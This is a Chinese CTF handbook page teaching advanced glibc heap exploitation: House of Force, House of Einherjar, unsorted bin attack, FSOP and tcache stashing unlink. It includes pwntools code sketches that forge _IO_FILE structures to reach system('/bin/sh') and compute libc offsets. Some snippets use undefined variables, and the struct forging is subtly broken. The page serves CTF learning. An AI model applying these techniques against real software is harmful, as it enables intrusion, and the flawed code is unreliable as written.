---
title: 堆利用进阶
order: 9
icon: mdi:memory
category:
  - CTF
  - 手册
  - Pwn
---

在掌握堆基础（tcache poisoning、fastbin dup）之后，本节介绍更多堆利用技术。

## House of Force

::: warning glibc 版本限制
House of Force 仅在 glibc < 2.29 有效。glibc 2.29 起加入了 top chunk size 校验，阻止了此攻击。
:::

利用 top chunk 的大小字段，通过分配超大 chunk 来控制 top chunk 指针，进而分配到任意地址。

```python
from pwn import *

# 条件：
# 1. 可以溢出覆盖 top chunk 的 size 字段
# 2. malloc 的大小可控

# 步骤：
# 1. 将 top chunk size 改为 0xffffffffffffffff（最大值）
# 2. 计算到目标地址的距离
# 3. malloc 一个特定大小，使 top chunk 移动到目标地址前
# 4. 再次 malloc，得到目标地址处的 chunk

def house_of_force(target_addr, top_chunk_addr, malloc_func):
    # 覆盖 top chunk size
    overflow_payload = b'A' * offset + p64(0xffffffffffffffff)

    # 计算需要分配的大小
    # top_chunk_addr + 0x10 + size = target_addr - 0x10
    size = target_addr - top_chunk_addr - 0x20
    malloc_func(size)  # 移动 top chunk

    # 现在 top chunk 在 target_addr - 0x10
    malloc_func(0x10)  # 分配到 target_addr
```

## House of Einherjar

利用 off-by-one 漏洞（写入一个额外字节），修改下一个 chunk 的 prev_size 和 PREV_INUSE 位，触发向前合并到伪造的 chunk。

```python
# 条件：off-by-one 漏洞（可以写入 \x00 或任意字节）

# 步骤：
# 1. 在 bss/heap 上伪造一个 fake chunk
# 2. 利用 off-by-one 清除下一个 chunk 的 PREV_INUSE 位
# 3. 设置 prev_size 指向 fake chunk
# 4. free 该 chunk，触发向后合并（与低地址的 fake chunk 合并）
# 5. 合并后的 chunk 覆盖目标区域

# 关键：fake chunk 需要通过 unlink 的检查
# fd->bk == fake_chunk && bk->fd == fake_chunk
```

## Unsorted Bin Attack

::: warning glibc 版本限制
Unsorted Bin Attack 在 glibc 2.29 中被修复（加入了双向链表完整性检查）。仅在 glibc < 2.29 有效。
:::

将 unsorted bin 中的 chunk 的 bk 指针改为目标地址 - 0x10，当该 chunk 被取出时，会向目标地址写入一个大值（main_arena 地址）。

```python
# 条件：可以修改 unsorted bin 中 chunk 的 bk 指针
# 效果：向 target - 0x10 + 0x10 = target 写入 unsorted_bin 地址（大值）
# 用途：覆盖 global_max_fast 为大值，使所有大小都进入 fastbin

# 示例：覆盖 _IO_list_all 触发 FSOP
target = libc.sym['_IO_list_all'] - 0x10
# 修改 unsorted chunk 的 bk = target
# 下次 malloc 时触发写入
```

## FSOP（File Stream Oriented Programming）

通过伪造 `_IO_FILE` 结构体，在程序调用 `exit()` 或 `fflush()` 时执行任意代码。

```python
# _IO_FILE 结构体关键字段（glibc 2.23）
# 偏移 0x00: _flags
# 偏移 0x20: _IO_write_base
# 偏移 0x28: _IO_write_ptr
# 偏移 0xc0: _mode
# 偏移 0xd8: vtable 指针

# 伪造 _IO_FILE 触发条件（_IO_flush_all_lockp）：
# 1. _flags & _IO_MAGIC == _IO_MAGIC（_flags = 0xfbad0000 + ...）
# 2. _IO_write_ptr > _IO_write_base
# 3. _mode <= 0

def forge_io_file(system_addr, bin_sh_addr):
    fake_file = b'\x00' * 0xd8
    # 设置 _flags
    fake_file = p64(0xfbad2800) + fake_file[8:]
    # 设置 _IO_write_base 和 _IO_write_ptr
    fake_file = fake_file[:0x20] + p64(bin_sh_addr) + p64(bin_sh_addr + 8)
    # 设置 vtable 指向伪造的 vtable
    fake_file = fake_file[:0xd8] + p64(fake_vtable)
    return fake_file
```

## Tcache Stashing Unlink Attack（glibc 2.29+）

利用 calloc 不从 tcache 取 chunk 的特性，配合 smallbin 的 stash 机制：

```python
# 条件：glibc 2.29+，可以修改 smallbin 中 chunk 的 bk 指针
# 效果：向任意地址写入 main_arena 地址，并将任意地址加入 tcache

# 步骤：
# 1. 填满 tcache（7个同大小 chunk）
# 2. 再释放 2 个同大小 chunk 进入 smallbin
# 3. 修改 smallbin 中第二个 chunk 的 bk = target - 0x10
# 4. 用 calloc 申请同大小 chunk（calloc 不走 tcache）
# 5. smallbin 中剩余的 chunk 会被 stash 到 tcache
# 6. target 被加入 tcache，下次 malloc 可以得到 target
```

## 常用 Heap 调试技巧

```python
# pwndbg 命令
# heap          查看所有 chunk
# bins          查看所有 bin
# vis_heap_chunks  可视化 heap
# malloc_chunk addr  查看指定地址的 chunk 信息

# 查看 tcache 状态
# tcache        显示 tcache 中的所有 chunk

# 在 malloc/free 处下断点
# b malloc
# b free
# b __libc_malloc
```

```python
# 常用 libc 偏移（需要根据实际版本调整）
# 用 pwndbg 的 vmmap 找 libc 基址
# 用 p &main_arena 找 main_arena 偏移

# LibcSearcher 自动查找
from LibcSearcher import LibcSearcher
libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - libc.dump("puts")
system = libc_base + libc.dump("system")
bin_sh = libc_base + libc.dump("str_bin_sh")
```

## 练手资源

- [how2heap](https://github.com/shellphish/how2heap) — 各种堆利用技术的示例代码（强烈推荐）
- CTFHub Pwn 堆系列
- 攻防世界 Pwn 堆题目
- [Heap Exploitation](https://heap-exploitation.dhavalkapil.com/) — 堆利用教程
